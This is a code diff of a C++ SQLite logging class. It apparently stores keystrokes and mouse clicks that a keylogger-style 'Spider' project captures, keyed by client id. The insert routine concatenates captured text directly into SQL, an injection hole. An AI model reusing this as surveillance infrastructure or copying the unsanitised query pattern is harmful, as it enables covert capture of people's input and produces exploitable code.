@@ -1,11 +1,16 @@
+#include <KeyStroke.hpp>
+#include <MouseClick.hpp>
 #include "DataBaseLog.hpp"
 
 DataBaseLog::DataBaseLog() {
-    _sqlCreateKeyStroke =  "CREATE TABLE IF NOT EXISTS KEY_STROKE("  \
-                  "ID           TEXT    NOT NULL);";
-
-    _sqlCreateMouseClick =  "CREATE TABLE IF NOT EXISTS MOUSE_CLICK("  \
-                  "ID           TEXT    NOT NULL);";
+    _sqlCreateTable =   "CREATE TABLE IF NOT EXISTS SPIDER("
+                        "client_id TEXT,"
+                        "time_stamp DATETIME DEFAULT (DATETIME('now', 'localtime')),"
+                        "button CHAR DEFAULT 0,"
+                        "x SHORT INTEGER DEFAULT 0,"
+                        "y SHORT INTEGER DEFAULT 0,"
+                        "text TEXT DEFAULT NULL,"
+                        "id INTEGER PRIMARY KEY AUTOINCREMENT);";
 }
 
 DataBaseLog::~DataBaseLog() {
@@ -21,18 +26,10 @@ void DataBaseLog::open(std::string const & path){
         std::cerr << sqlite3_errmsg(_sqlDataBase) << std::endl;
         _good = false;
     }
-    ret = sqlite3_exec(_sqlDataBase, _sqlCreateKeyStroke.c_str(), nullptr, nullptr, &sqlErrMsg);
+    ret = sqlite3_exec(_sqlDataBase, _sqlCreateTable.c_str(), nullptr, nullptr, &sqlErrMsg);
     if (ret != SQLITE_OK)
     {
-        std::cerr << "Error while creating key_stroke table" << std::endl;
-        std::cerr << "SQL error: " + std::string(sqlErrMsg) << std::endl;
-        sqlite3_free(sqlErrMsg);
-        _good = false;
-    }
-    ret = sqlite3_exec(_sqlDataBase, _sqlCreateMouseClick.c_str(), nullptr, nullptr, &sqlErrMsg);
-    if (ret != SQLITE_OK)
-    {
-        std::cerr << "Error while creating mouse_click table" << std::endl;
+        std::cerr << "Error while creating table" << std::endl;
         std::cerr << "SQL error: " + std::string(sqlErrMsg) << std::endl;
         sqlite3_free(sqlErrMsg);
         _good = false;
@@ -52,44 +49,70 @@ bool DataBaseLog::isGood() const {
 }
 
 void DataBaseLog::insert(APacket const &param, std::string const &id) {
+    int type;
+    std::string query = "", x = "", y = "";
+    char *sqlErrMsg;
+    char button;
 
+    _dataBaseParser.clear();
+    param.to_readable(_dataBaseParser);
+
+    _dataBaseParser.get("Type", type);
+    switch (type) {
+        case PacketType::MOUSECLICK:
+
+            _dataBaseParser.get("X", x);
+            _dataBaseParser.get("Y", y);
+            _dataBaseParser.get("Button", button);
+            query += "INSERT INTO SPIDER(x, y, button, client_id) VALUES(" + x + ", " + y + ", "  + button + ", " + id + ");";
+            break;
+        case PacketType::KEYSTROKES:
+            std::string text = "";
+
+            _dataBaseParser.get("Data", text);
+            query += "INSERT INTO SPIDER(text, client_id) VALUES(\"" + text + "\", " + id + ");";
+            break;
+    }
+    int ret = sqlite3_exec(_sqlDataBase, query.c_str(), nullptr, nullptr, &sqlErrMsg);
+    if (ret != SQLITE_OK) {
+        std::cerr << sqlErrMsg << std::endl;
+        sqlite3_free(sqlErrMsg);
+    }
 }
 
 std::vector<APacket *> DataBaseLog::dump() {
-    std::vector<APacket *> allTablesRow;
-
-    allTablesRow = getAllRowFromTable("KEY_STROKE");
-    return allTablesRow;
-}
-
-std::vector<APacket *> DataBaseLog::getAllRowFromTable(std::string tableName) {
-    std::string query = "SELECT * FROM " + tableName;
-    std::vector<APacket *> allRow;
+    std::vector<APacket *> allRowSorted;
+    std::string query = "SELECT * FROM SPIDER ORDER BY id ASC";
     sqlite3_stmt *stmt;
     int ret;
 
     ret = sqlite3_prepare(_sqlDataBase, query.c_str(), query.size() + 1, &stmt, NULL);
     if (ret != SQLITE_OK) {
         _good = false;
-        std::cerr << "Error while getting all row from \"" + tableName + "\"" << std::endl;
-        return allRow;
+        std::cerr << "Error while getting all row from spider table" << std::endl;
+        return allRowSorted;
     }
 
     while ((ret = sqlite3_step(stmt)) == SQLITE_ROW) {
-        const unsigned char * text;
-        text  = sqlite3_column_text (stmt, 0);
-        std::cout << text << std::endl;
+        APacket *packet = nullptr;
+        const unsigned char *text = nullptr;
+
+        text  = sqlite3_column_text (stmt, 5);
+        if (text != nullptr) {
+            packet = new KeyStroke(std::string(reinterpret_cast<const char *>(text)));
+        } else {
+            packet = new MouseClick(sqlite3_column_int(stmt, 2),
+                                    sqlite3_column_int(stmt, 3),
+                                    sqlite3_column_int(stmt, 4));
+        }
+        allRowSorted.push_back(packet);
+        text = nullptr;
     }
     if (ret != SQLITE_DONE) {
         _good = false;
-        std::cerr << "Error while getting all row from \"" + tableName + "\"" << std::endl;
-        return allRow;
+        std::cerr << "Error while getting all row from spider table" << std::endl;
+        return allRowSorted;
     }
     sqlite3_finalize(stmt);
-    return allRow;
-}
-
-
-APacket *DataBaseLog::rowToAPacket() {
-
+    return allRowSorted;
 }
